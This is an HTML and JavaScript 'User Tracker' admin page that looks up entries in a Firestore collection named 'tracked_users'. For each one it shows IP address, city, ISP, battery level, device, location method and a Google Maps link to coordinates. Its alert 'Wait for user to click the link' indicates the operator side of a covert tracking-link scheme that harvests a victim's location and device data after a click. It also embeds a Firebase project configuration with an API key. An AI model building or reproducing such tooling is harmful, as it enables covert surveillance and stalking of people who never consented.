<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        input { padding: 10px; width: 60%; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
        .data-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
        .data-label { font-weight: bold; color: #555; }
        .data-value { color: #000; text-align: right; }
        #map-link { display: block; text-align: center; background: #28a745; color: white; padding: 10px; text-decoration: none; margin-top: 20px; border-radius: 4px; }
    </style>
</head>
<body>

    <div class="container">
        <h2 style="text-align:center">User Tracker</h2>
        <div style="text-align:center; margin-bottom: 20px;">
            <input type="text" id="inputId" placeholder="Enter ID (e.g., 8585814444)">
            <button onclick="getData()">Check</button>
        </div>

        <div id="results" style="display:none;">
            <div class="data-row"><span class="data-label">Time:</span> <span class="data-value" id="time"></span></div>
            <div class="data-row"><span class="data-label">IP Address:</span> <span class="data-value" id="ip"></span></div>
            <div class="data-row"><span class="data-label">Location:</span> <span class="data-value" id="city"></span></div>
            <div class="data-row"><span class="data-label">ISP:</span> <span class="data-value" id="isp"></span></div>
            <div class="data-row"><span class="data-label">Battery:</span> <span class="data-value" id="battery"></span></div>
            <div class="data-row"><span class="data-label">Device:</span> <span class="data-value" id="device"></span></div>
            <div class="data-row"><span class="data-label">Method:</span> <span class="data-value" id="method"></span></div>
            
            <a id="map-link" target="_blank" href="#">Open Google Maps</a>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAgisxeeq0hYN-7SF62IGkvZHPVmWnyThg",
            authDomain: "xyze-9b306.firebaseapp.com",
            projectId: "xyze-9b306",
            storageBucket: "xyze-9b306.firebasestorage.app",
            messagingSenderId: "814674031370",
            appId: "1:814674031370:web:aa8f08895c1d305b2540f3",
            measurementId: "G-33ZZ3HXVFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.getData = async function() {
            const id = document.getElementById('inputId').value;
            if(!id) return alert("Enter ID");

            const docRef = doc(db, "tracked_users", id);
            const docSnap = await getDoc(docRef);

            if (docSnap.exists()) {
                const data = docSnap.data();
                document.getElementById('results').style.display = 'block';
                document.getElementById('time').innerText = data.lastUpdated;
                document.getElementById('ip').innerText = data.ip;
                document.getElementById('city').innerText = data.city;
                document.getElementById('isp').innerText = data.isp;
                document.getElementById('battery').innerText = data.battery;
                document.getElementById('device').innerText = data.platform;
                document.getElementById('method').innerText = data.locationMethod;
                
                // Map Link
                document.getElementById('map-link').href = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
            } else {
                alert("ID not found yet. Wait for user to click the link.");
            }
        }
    </script>
</body>
</html>
